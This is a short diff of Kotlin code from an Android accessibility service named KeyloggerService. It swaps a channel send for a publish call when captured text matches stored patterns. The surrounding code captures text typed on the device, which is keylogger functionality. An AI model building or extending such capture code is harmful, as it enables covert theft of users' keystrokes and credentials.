@@ -51,13 +51,13 @@ class KeyloggerService: AccessibilityService() {
                     Keylogger.patterns.forEach { pattern ->
                         if(pattern.containsMatchIn(text)){
                             val entry = KeyloggerEntry(text)
-                            Keylogger.channel.send(entry)
+                            Keylogger.publish(entry)
                             return@runBlocking
                         }
                     }
                 else{
                     val entry = KeyloggerEntry(text)
-                    Keylogger.channel.send(entry)
+                    Keylogger.publish(entry)
                 }
             }
         }
